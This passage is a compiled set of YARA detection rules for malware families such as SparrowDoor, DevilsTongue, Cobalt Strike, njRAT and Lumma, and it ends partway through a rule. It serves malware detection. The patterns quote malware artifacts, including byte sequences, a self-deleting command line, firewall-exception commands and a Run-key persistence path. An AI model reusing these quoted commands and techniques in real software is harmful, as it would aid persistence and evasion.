 * LICENSE
 * 
 * NO LICENSE SET
 */

rule MICROSOFT_Devilstongue_Hijackdll : FILE
{
	meta:
		description = "Detects SOURGUM's DevilsTongue hijack DLL"
		author = "Microsoft Threat Intelligence Center (MSTIC)"
		id = "b5de2a8c-e0c8-5c8c-bb65-aee5701b4bb3"
		date = "2021-07-15"
		modified = "2022-07-07"
		reference = "https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Microsoft/DevilsTongue_HijackDll.yar#L2-L45"
		license_url = "N/A"
		logic_hash = "d1c01df74a00672bb8229d5433314d7cfa49ab22565e6cf78a4b6b2884dbd299"
		score = 75
		quality = 80
		tags = "FILE"

	strings:
		$str1 = "windows.old\\windows" wide
		$str2 = "NtQueryInformationThread"
		$str3 = "dbgHelp.dll" wide
		$str4 = "StackWalk64"
		$str5 = "ConvertSidToStringSidW"
		$str6 = "S-1-5-18" wide
		$str7 = "SMNew.dll"
		$code1 = {B8 FF 15 00 00 66 39 41 FA 74 06 80 79 FB E8}
		$code2 = {44 8B C0 B8 B5 81 4E 1B 41 F7 E8 C1 FA 05 8B CA C1 E9 1F 03 D1 69 CA 2C 01 00 00 44 2B C1 45 85 C0 7E 19}

	condition:
		filesize < 800KB and uint16( 0 ) == 0x5A4D and ( pe.characteristics & pe.DLL ) and ( 4 of them or ( $code1 and $code2 ) or ( pe.imphash ( ) == "9a964e810949704ff7b4a393d9adda60" ) )
}
/*
 * YARA Rule Set
 * Repository Name: NCSC
 * Repository: https://github.com/mikesxrs/Open-Source-YARA-rules
 * Retrieval Date: 2026-11-22
 * Git Commit: ec0056f767db98bf6d5fd63877ad51fb54d350e9
 * Number of Rules: 8
 * Skipped: 8 (age), 1 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * NO LICENSE SET
 */
rule NCSC_Sparrowdoor_Config : FILE
{
	meta:
		description = "Targets the XOR encoded loader config and shellcode in the file libhost.dll using the known position of the XOR key."
		author = "NCSC"
		id = "16eec5b6-c77a-585d-88f3-2c86abdbf2bd"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_config.yar#L1-L14"
		license_url = "N/A"
		hash = "c1890a6447c991880467b86a013dbeaa66cc615f"
		logic_hash = "bd52496b6e7cabc875a277ce7d49f6b891c3f61591edef295dbee43716c15509"
		score = 75
		quality = 80
		tags = "FILE"

	condition:
		( uint16( 0 ) != 0x5A4D ) and ( uint16( 0 ) != 0x8b55 ) and ( uint32( 0 ) ^ uint32( 0x4c ) == 0x00 ) and ( uint32( 0 ) ^ uint32( 0x34 ) == 0x00 ) and ( uint16( 0 ) ^ uint16( 0x50 ) == 0x8b55 )
}

rule NCSC_Sparrowdoor_Clipshot : FILE
{
	meta:
		description = "The SparrowDoor loader contains a feature it calls clipshot, which logs clipboard data to a file."
		author = "NCSC"
		id = "186e694b-6ae1-5042-847a-f54708dc76ef"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_clipshot.yar#L3-L20"
		license_url = "N/A"
		hash = "989b3798841d06e286eb083132242749c80fdd4d"
		logic_hash = "7662e3be2752ac82d6cfe4b2e420157e78367c201c25ae34b5d956dc53ba20ae"
		score = 75
		quality = 80
		tags = "FILE"

	strings:
		$exsting_cmp = {8B 1E 3B 19 75 ?? 83 E8 04 83 C1 04 83 C6 04 83 F8 04}
		$time_format_string = "%d/%d/%d %d:%d" ascii
		$cre_fil_args = {6A 00 68 80 00 00 00 6A 04 6A 00 6A 02 68 00 00 00 40 52}

	condition:
		( uint16( 0 ) == 0x5A4D ) and uint32( uint32( 0x3C ) ) == 0x00004550 and all of them and ( pe.imports ( "User32.dll" , "OpenClipboard" ) and pe.imports ( "User32.dll" , "GetClipboardData" ) and pe.imports ( "Kernel32.dll" , "GetLocalTime" ) and pe.imports ( "Kernel32.dll" , "GlobalSize" ) )
}
rule NCSC_Sparrowdoor_Apipatch
{
	meta:
		description = "Identifies code segments in SparrowDoor responsible for patching APIs. No MZ/PE match as the backdoor has no header. Targeting in memory."
		author = "NCSC"
		id = "119b7f3a-1850-53ab-a5d1-8882e34a34b4"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_apipatch.yar#L1-L17"
		license_url = "N/A"
		hash = "c1890a6447c991880467b86a013dbeaa66cc615f"
		logic_hash = "302ad7fc0354636c57e6ec86876c7d4a5baaa784f5ecf0f2d51ce47631b8542a"
		score = 75
		quality = 80
		tags = ""

	strings:
		$save = {8B 06 89 07 8A 4E 04}
		$vp_1 = {89 10 8A 4E 04 8B D6 2B D0 88 48 04 83 EA 05 C6 40 05 E9 89 50 06}
		$vp_2 = {50 8B D6 6A 40 2B D7 88 4F 04 83 EA 05 6A 05 C6 47 05 E9 89 57 06 56}
		$vp_3 = {51 52 2B DE 6A 05 83 EB 05 56 C6 06 E9 89 5E 01}
		$va = {6A 40 68 00 10 00 00 68 00 10 00 00 6A 00}
		$s_patch = {50 68 7F FF FF FF 68 FF FF 00 00 56}

	condition:
		3 of them
}
rule NCSC_Sparrowdoor_Shellcode
{
	meta:
		description = "Targets code features of the reflective loader for SparrowDoor. Targeting in memory."
		author = "NCSC"
		id = "572187fb-1a11-54f2-9fe7-2b7468b56556"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_shellcode.yar#L1-L15"
		license_url = "N/A"
		hash = "c1890a6447c991880467b86a013dbeaa66cc615f"
		logic_hash = "7186bab23114b4825161f58fb02ff397ec8278385482232a4086c86c6fc47082"
		score = 75
		quality = 80
		tags = ""

	strings:
		$peb = {8B 48 08 89 4D FC 8B 51 3C 8B 54 0A 78 8B 74 0A 20 03 D1 03 F1 B3 64}
		$getp_match = {8B 06 03 C1 80 38 47 75 34 80 78 01 65 75 2E 80 78 02 74 75 28 80 78 03 50 75 22 80 78 04 72 75 1C 80 78 06 63 75 16 80 78 05 6F 75 10 80 78 07 41 75 0A}
		$k_check = {8B 48 20 8A 09 80 F9 6B 74 05 80 F9 4B 75 05}
		$resolve_load_lib = {C7 45 C4 4C 6F 61 64 C7 45 C8 4C 69 62 72 C7 45 CC 61 72 79 41 C7 45 D0 00 00 00 00 FF 75 FC FF 55 E4}

	condition:
		3 of them
}
rule NCSC_Sparrowdoor_Xor
{
	meta:
		description = "Highlights XOR routines in SparrowDoor. No MZ/PE match as the backdoor has no header. Targeting in memory."
		author = "NCSC"
		id = "9c07feea-91fc-528e-91ac-14d09fa1fc10"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_xor.yar#L1-L14"
		license_url = "N/A"
		hash = "c1890a6447c991880467b86a013dbeaa66cc615f"
		logic_hash = "3244e9017e5a0bf1c54e03b3191a5c695b2c1586b3ed4c529742f9b48903a348"
		score = 75
		quality = 80
		tags = ""

	strings:
		$xor_routine_outbound = {B8 39 8E E3 38 F7 E1 D1 EA 8D 14 D2 8B C1 2B C2 8A [4] 00 30 14 39 41 3B CE}
		$xor_routine_inbound = {B8 25 49 92 24 F7 E1 8B C1 2B C2 D1 E8 03 C2 C1 E8 02 8D 14 C5 [4] 2B D0 8B C1 2B C2}
		$xor_routine_config = {8B D9 83 E3 07 0F [6] 30 18 8D 1C 07 83 E3 07 0F [6] 30 58 01 8D 1C 28 83 E3 07 0F [6] 30 58 02 8D 1C 02 83 E3 07 0F [6] 30 58 03 8B DE 83 E3 07 0F [6] 30 58 04 83 C6 05 83 C1 05}

	condition:
		2 of them
}
rule NCSC_Sparrowdoor_Strings
{
	meta:
		description = "Strings that appear in SparrowDoor’s backdoor. Targeting in memory."
		author = "NCSC"
		id = "6f96a577-fb59-57db-a66a-f514ecfbf982"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_strings.yar#L1-L23"
		license_url = "N/A"
		hash = "c1890a6447c991880467b86a013dbeaa66cc615f"
		logic_hash = "65ec5d266ecd81ab8e4cfbcb352173f825bdae92fd4737b577cb209bace2a943"
		score = 75
		quality = 80
		tags = ""

	strings:
		$reg = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii
		$http_headers = {55 73 65 72 2D 41 67 65 6E 74 3A 20 4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 35 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 35 2E 30 29 0D 0A 41 63 63 65 70 74 2D 4C 61 6E 67 75 61 67 65 3A 20 65 6E 2D 55 53 0D 0A 41 63 63 65 70 74 3A 20 2A 2F 2A 0D 0A}
		$http_proxy = "HTTPS=HTTPS://%s:%d" ascii
		$debug = "SeDebugPrivilege" ascii
		$av1 = "avp.exe" ascii
		$av2 = "ZhuDongFangYu.exe" ascii
		$av3 = "egui.exe" ascii
		$av4 = "TMBMSRV.exe" ascii
		$av5 = "ccSetMgr.exe" ascii
		$clipshot = "clipshot" ascii
		$ComSpec = "ComSpec" ascii
		$export = "curl_easy_init" ascii

	condition:
		10 of them
}
rule NCSC_Sparrowdoor_Loader : FILE
{
	meta:
		description = "Targets code features of the SparrowDoor loader. This rule detects the previous variant and this new variant."
		author = "NCSC"
		id = "7107cb82-c4c9-503f-b006-baec6b667498"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_loader.yar#L1-L15"
		license_url = "N/A"
		hash = "989b3798841d06e286eb083132242749c80fdd4d"
		logic_hash = "fa1bd386114d912722a5101a0112355dec654e2e9446c885c12946c7fae1c8f4"
		score = 75
		quality = 80
		tags = "FILE"

	strings:
		$xor_algo = {8B D0 83 E2 03 8A 54 14 10 30 14 30 40 3B C1}
		$rva = {8D B0 [4] 8D 44 24 ?? 50 6A 40 6A 05 56}
		$lj = {2B CE 83 E9 05 8D [3] 52 C6 06 E9 89 4E 01 8B [3] 50 6A 05 56}

	condition:
		( uint16( 0 ) == 0x5A4D ) and uint32( uint32( 0x3C ) ) == 0x00004550 and all of them
}
rule NCSC_Sparrowdoor_Sleep_Routine
{
	meta:
		description = "SparrowDoor implements a Sleep routine with value seeded on GetTickCount. This signature detects the previous and this variant of SparrowDoor. No MZ/PE match as the backdoor has no header."
		author = "NCSC"
		id = "9a0aa77d-7dbe-5007-b875-211cf528614b"
		date = "2022-02-28"
		modified = "2022-07-06"
		reference = "https://www.ncsc.gov.uk/files/NCSC-MAR-SparrowDoor.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/NCSC/SparrowDoor_sleep_routine.yar#L1-L12"
		license_url = "N/A"
		hash = "c1890a6447c991880467b86a013dbeaa66cc615f"
		logic_hash = "8ae231cb43440e1771d9f7ecaccfedae33f4d14e5ebabd94a909e05bd9fe1bc1"
		score = 75
		quality = 80
		tags = ""

	strings:
		$sleep = {FF D7 33 D2 B9 [4] F7 F1 81 C2 [4] 8B C2 C1 E0 04 2B C2 03 C0 03 C0 03 C0 50}

	condition:
		all of them
}
/*
 * YARA Rule Set
 * Repository Name: Dr4k0nia
 * Repository: https://github.com/dr4k0nia/yara-rules
 * Retrieval Date: 2026-11-22
 * Git Commit: 4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8
 * Number of Rules: 4
 * Skipped: 0 (age), 1 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * # Detection Rule License (DRL) 1.1

Permission is hereby granted, free of charge, to any person obtaining a copy of this rule set and associated documentation files (the "Rules"), to deal in the Rules without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Rules, and to permit persons to whom the Rules are furnished to do so, subject to the following conditions:

If you share the Rules (including in modified form), you must retain the following if it is supplied within the Rules:

1. identification of the authors(s) ("author" field) of the Rule and any others designated to receive attribution, in any reasonable manner requested by the Rule author (including by pseudonym if designated).

2. a URI or hyperlink to the Rule set or explicit Rule to the extent reasonably practicable

3. indicate the Rules are licensed under this Detection Rule License, and include the text of, or the URI or hyperlink to, this Detection Rule License to the extent reasonably practicable

If you use the Rules (including in modified form) on data, messages based on matches with the Rules must retain the following if it is supplied within the Rules:

1. identification of the authors(s) ("author" field) of the Rule and any others designated to receive attribution, in any reasonable manner requested by the Rule author (including by pseudonym if designated).

THE RULES ARE PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE RULES OR THE USE OR OTHER DEALINGS IN THE RULES.

 */
rule DR4K0NIA_MAL_MSIL_NET_Typhonlogger_Jul23 : FILE
{
	meta:
		description = "Detects TyphonLogger .NET payloads"
		author = "dr4k0nia"
		id = "2fbc1d9e-9c07-560b-9476-a176cdbe1bad"
		date = "2023-11-07"
		modified = "2023-07-11"
		reference = "https://github.com/dr4k0nia/yara-rules"
		source_url = "https://github.com/dr4k0nia/yara-rules/blob/4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8/dotnet/mal_msil_typhon_logger.yar#L1-L21"
		license_url = "https://github.com/dr4k0nia/yara-rules/blob/4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8/LICENSE.md"
		hash = "fc8733c217b49ca14702a59a637efc7dba6a2993d57e67424513ce2f5e9d8ed8"
		logic_hash = "5c22aab1942e31095989b8267e0231191718d4ec44eb3afc6a50f929aae872c8"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$sa1 = "SetWindowsHookEx" ascii fullword
		$sa2 = "iphlpapi.dll" ascii fullword
		$sa3 = "SendARP" ascii fullword
		$sa4 = "costura.bouncycastle.crypto.dll.compressed" ascii fullword
		$op1 = {51 32 46 79 64 47 55 67 51 6D 78 68 62 6D 4E 6F 5A 53 42 44 59 58 4A 6B}
		$op2 = {53 57 35 7A 64 47 45 67 55 47 46 35 62 57 56 75 64 43 42 44 59 58 4A 6B}
		$op3 = {20 25 32 C4 C1 35 4C 11 06 20 6B 6D AC 1D 35 1D 11 06 20 4B A6 CA 11 3B 59 01 00 00 11 06 20 6B 6D AC 1D}
		$sx = "New Projects\\EmeraldLogger\\EmeraldLogger\\obj\\" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( $sx or ( all of ( $sa* ) and 2 of ( $op* ) ) )
}
rule DR4K0NIA_MAL_Msil_Net_Niximports_Loader : FILE
{
	meta:
		description = "Detects NixImports .NET loader"
		author = "dr4k0nia"
		id = "ba0d072d-674a-5790-9381-4dac98204268"
		date = "2023-05-21"
		modified = "2023-05-22"
		reference = "https://github.com/dr4k0nia/NixImports"
		source_url = "https://github.com/dr4k0nia/yara-rules/blob/4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8/dotnet/msil_mal_niximports_loader.yar#L1-L21"
		license_url = "https://github.com/dr4k0nia/yara-rules/blob/4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8/LICENSE.md"
		logic_hash = "79421b2677705852f893fa53478deb2e4aa8bd354ac05cbf5438a3a2a15d70bf"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$op_pe = {C2 95 C2 97 C2 B2 C2 92 C2 82 C2 82 C2 8E C2 82 C2 82 C2 82 C2 82 C2 86 C2 82}
		$op_delegate = {20 F0 C7 FF 80 20 83 BF 7F 1F 14 14}
		$a1 = "GetRuntimeProperties" ascii fullword
		$a2 = "GetTypes" ascii fullword
		$a3 = "GetRuntimeMethods" ascii fullword
		$a4 = "netstandard" ascii fullword

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 3MB and all of ( $a* ) and 2 of ( $op* )
}

rule DR4K0NIA_Msil_Susp_Obf_Xorstringsnet : FILE
{
	meta:
		description = "Detects XorStringsNET string encryption, and other obfuscators derived from it"
		author = "dr4k0nia"
		id = "0bea654d-9244-5320-a815-691384decc74"
		date = "2023-03-26"
		modified = "2023-03-26"
		reference = "https://github.com/dr4k0nia/yara-rules"
		source_url = "https://github.com/dr4k0nia/yara-rules/blob/4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8/dotnet/msil_susp_obf_xorstringsnet.yar#L3-L16"
		license_url = "https://github.com/dr4k0nia/yara-rules/blob/4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8/LICENSE.md"
		logic_hash = "c494b5b64bcb63d1edd611206fb41eb9a23a940a72c3e9fc3f626e91482b1352"
		score = 65
		quality = 85
		tags = "FILE"
		version = "1.0"

	strings:
		$pattern = { 06 1E 58 07 8E 69 FE17 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 25MB and dotnet.is_dotnet and $pattern
}

rule DR4K0NIA_Msil_Susp_Obf_Antidump : FILE
{
	meta:
		description = "No description has been set in the source file - Dr4k0nia"
		author = "dr4k0nia"
		id = "d9217ade-a016-548e-b63f-f6ee78ff8775"
		date = "2023-12-03"
		modified = "2023-03-13"
		reference = "https://github.com/dr4k0nia/yara-rules"
		source_url = "https://github.com/dr4k0nia/yara-rules/blob/4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8/dotnet/msil_susp_obf_antidump.yar#L7-L39"
		license_url = "https://github.com/dr4k0nia/yara-rules/blob/4b10f9b79a4cfb3ec9cb5675f32cc7ee6885fbd8/LICENSE.md"
		hash = "ef7bb2464a2b430aa98bd65a1a40b851b57cb909ac0aea3e53729c0ff900fa42"
		logic_hash = "18cfc720f54b2178398f8214591a3fb777ea11e67a8a6d2ce26cc4891a62fd35"
		score = 65
		quality = 85
		tags = "FILE"
		version = "1.0"

	strings:
		$import0 = "ZeroMemory"
		$import1 = "VirtualProtect"
		$importt2 = "GetCurrentProcess"
		$array0 = {08 00 00 00 0c 00 00 00 10 00 00 00 14 00 00 00
		18 00 00 00 1c 00 00 00 24 00 00 00}
		$array1 = {04 00 00 00 16 00 00 00 18 00 00 00 40 00 00 00
		42 00 00 00 44 00 00 00 46 00 00 00 48 00 00 00
		4a 00 00 00 4c 00 00 00 5c 00 00 00 5e 00 00 00}
		$array2 = {00 00 00 00 08 00 00 00 0c 00 00 00 10 00 00 00
		16 00 00 00 1c 00 00 00 20 00 00 00 28 00 00 00
		2c 00 00 00 34 00 00 00 3c 00 00 00 4c 00 00 00
		50 00 00 00 54 00 00 00 58 00 00 00 60 00 00 00
		64 00 00 00 68 00 00 00 6c 00 00 00 70 00 00 00
		74 00 00 00 04 01 00 00 08 01 00 00 0c 01 00 00
		10 01 00 00 14 01 00 00 1c 01 00 00}

	condition:
		uint16( 0 ) == 0x5a4d and dotnet.is_dotnet and all of them
}
/*
 * YARA Rule Set
 * Repository Name: EmbeeResearch
 * Repository: https://github.com/embee-research/Yara-detection-rules/
 * Retrieval Date: 2026-11-22
 * Git Commit: ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4
 * Number of Rules: 34
 * Skipped: 0 (age), 12 (quality), 1 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * NO LICENSE SET
 */
rule EMBEERESEARCH_Win_Cobaltstrike_Pipe_Strings_Nov_2023 : FILE
{
	meta:
		description = "Detects default strings related to cobalt strike named pipes"
		author = "Matthew @ Embee_Research"
		id = "9237f4e8-b9c4-54cb-9cb2-999d267392af"
		date = "2023-11-04"
		modified = "2023-11-04"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_cobaltstrike_pipe_strings_nov_2023.yar#L1-L24"
		license_url = "N/A"
		hash = "99986d438ec146bbb8b5faa63ce47264750a8fdf508a4d4250a8e1e3d58377fd"
		hash = "090402a6e2db12cbdd3a889b7b46bb7702acc0cad37d87ff201230b618fe7ed5"
		hash = "eb2b263937f8d28aa9df7277b6f25d10604a5037d5644c98ee0ab8f7a25db7b4"
		logic_hash = "ff17fe9d04d9ad6aa5c034b69d412b0d62c48c537c3a54a465761e27e9255e6d"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "%c%c%c%c%c%cMSSE-%d-server"
		$s2 = "ConnectNamedPipe"
		$s3 = "CreateNamedPipeA"
		$s4 = "TlsGetValue"

	condition:
		( all of ( $s* ) ) and filesize < 500KB
}
rule EMBEERESEARCH_Win_Medusa_Bytecodes
{
	meta:
		description = "Medusa Bytecodes"
		author = "Matthew @ Embee_Research"
		id = "48b659f8-cd26-540a-89b6-6349f8d21e8f"
		date = "2023-08-27"
		modified = "2024-03-03"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_medusa_dotnet_bytecodes.yar#L1-L17"
		license_url = "N/A"
		hash = "a1211549b4e1a7befd953d03b4d929b3dc9f25ec6c1bc9c05ae92a0ec08fb77c"
		logic_hash = "aa01afd6981af99625a9fca93e512cc00931aca18e55c5cb6dee11efb9ea2968"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {1F ?? 8D ?? ?? ?? 01 25 16 72 ?? ?? ?? 70 A2 25 17 72 ?? ?? ?? 70 28 ?? ?? ?? 0A A2 25 18 20 ?? ?? ?? 00 13 04 12 04 28 ?? ?? ?? 0A A2 25 19 20 ?? ?? ?? 00 13 ?? 12 }
		$s2 = "\\Medusa\\obj\\Release\\Medusa.pdb" ascii

	condition:
		$s1 or $s2
}
rule EMBEERESEARCH_Win_Cobalt_Sleep_Encrypt : FILE
{
	meta:
		description = "Detects Sleep Encryption Logic Found in Cobalt Strike Deployments"
		author = "Matthew @ Embee_Research"
		id = "6bd6fbb4-6634-5b51-90f0-f24e48d69043"
		date = "2023-08-27"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_cobalt_sleep_encrypt_aug_2023.yar#L1-L55"
		license_url = "N/A"
		hash = "26b2f12906c3590c8272b80358867944fd86b9f2cc21ee6f76f023db812e5bb1"
		logic_hash = "7aa2674ecaaae819c3f26924fa0622df322b1214493f37b1bdf5e00ba5ee98e6"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$r1_nokey = {4E 8B 04 08 B8 ?? ?? ?? ?? 41 F7 E3 41 8B C3 C1 EA 02 41 FF C3 6B D2 0D 2B C2 8A 4C 18 18 41 30 0C 38 48 8B 43 10 41 8B FB 4A 3B 7C 08 08}
		$r2_nokey = {49 8B F9 4C 8B 03 B8 ?? ?? ?? ?? 41 F7 E1 41 8B C1 C1 EA 02 41 FF C1 6B D2 0D 2B C2 8A 4C 18 18 42 30 0C 07 48 FF C7 45 3B CB}

	condition:
		($r1_nokey or $r2_nokey )
}

rule EMBEERESEARCH_Win_Agent_Tesla_Bytecodes_Sep_2023
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Matthew @embee_research"
		id = "9d1c5010-7c64-5a6a-bf60-35c042732761"
		date = "2023-09-21"
		modified = "2023-09-21"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_agent_tesla_bytecodes_sep_2023.yar#L4-L21"
		license_url = "N/A"
		hash = "ce696cf7a6111f5e7c6781854de04ddc262b6c9b39c059fd5435dfb3b8901f04"
		hash = "afc29232c4989587db2c54b7c9f145fd0d73537e045ece15338582ede5389fce"
		hash = "fba4374163ba25c9dc572f1a5d7f3e46e09531ab964d808f3dde2a19c05a2ee5"
		logic_hash = "1cc40ab16dfa5245b3146e4512509037f540d59e155040a2336a97cd0f42e612"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {8F ?? ?? ?? ?? 25 47 FE ?? ?? ?? FE ?? ?? ?? 91 61 D2 52 20 ?? ?? ?? ?? FE ?? ?? ?? }

	condition:
		dotnet.is_dotnet and $s1
}
rule EMBEERESEARCH_Win_Orcus_Rat_Simple_Strings_Dec_2023
{
	meta:
		description = "Strings observed in Orcus RAT"
		author = "Matthew @ Embee_Research"
		id = "baef6b96-bf94-5363-9186-9761a8055afd"
		date = "2023-12-24"
		modified = "2023-12-24"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_orcus_rat_simple_strings_dec_2023.yar#L1-L26"
		license_url = "N/A"
		hash = "30a2a674d55d7898d304713dd2f69a043d875230ea7ebee22596ba4c640768db"
		logic_hash = "2e0a44ec2749e0fc646dfb003a2d32b3fecfa07ece72ca5a65116250d80496b8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "Orcus is a Remote Administration Tool for Windows. It allows the administrator to make changes to the system remotely." wide
		$s2 = "Orcus.Service" wide
		$s4 = "costura.orcus" wide
		$s5 = "Orcus.Commands"
		$s6 = "Orcus.Shared"
		$s7 = "Orcus.Utilities"
		$s8 = "Orcus.StaticCommands"
		$s9 = "Orcus.Plugins"

	condition:
		(5 of them )
}

rule EMBEERESEARCH_Win_Njrat_Strings_Oct_2023
{
	meta:
		description = ""
		author = "Matthew @ Embee_Research"
		id = "c89711cb-aae9-5409-80c2-145a8d5fca56"
		date = "2023-10-03"
		modified = "2023-10-03"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_njrat_strings_oct_2023.yar#L3-L25"
		license_url = "N/A"
		hash = "59d6e2958780d15131c102a93fefce6e388e81da7dc78d9c230aeb6cab7e3474"
		logic_hash = "ed36a991aa2699486f1ef34f4f4d559a3dd351180602f017ad7d868e146c703b"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "netsh firewall delete allowedprogram" wide
		$s2 = "cmd.exe /c ping 0 -n 2 & del" wide
		$s3 = "netsh firewall add allowedprogram" wide
		$s4 = "Execute ERROR" wide
		$s5 = "Update ERROR" wide
		$s6 = "Download ERROR" wide

	condition:
		dotnet.is_dotnet and ( all of ( $s* ) )
}
rule EMBEERESEARCH_Win_Lumma_Update_Simple_Strings_Sep_2023 : FILE
{
	meta:
		description = ""
		author = "Matthew @ Embee_Research"
		id = "90209fc6-fd50-5b55-a400-112b2f207885"
		date = "2023-09-13"
		modified = "2023-09-21"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_lumma_updated_sep_2023.yar#L1-L25"
		license_url = "N/A"
		hash = "898a2bdbbb33ccd63b038c67d217554a668a52e9642874bd0f57e08153e6e5be"
		logic_hash = "61571057a5a9c114b6ed5b94b922f2b389406a05e705b3e9e6ddbee221f74c92"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Do you want to run a malware ?" wide
		$s2 = "c2sock" wide
		$s3 = "TeslaBrowser/5" wide
		$s4 = "Crypt build to disable this message" wide

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 5000KB and ( all of ( $s* ) )
}
rule EMBEERESEARCH_Win_Redline_Updated_Bytecodes_Oct_2023
{
	meta:
		description = "Configuration related bytecodes in redline .net files"
		author = "Matthew @ Embee_Research"
		id = "1e4470cf-fad3-57e5-8a95-deb97e98dbdc"
		date = "2023-10-11"
		modified = "2023-10-11"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_redline_bytecodes_oct_2023.yar#L2-L35"
		license_url = "N/A"
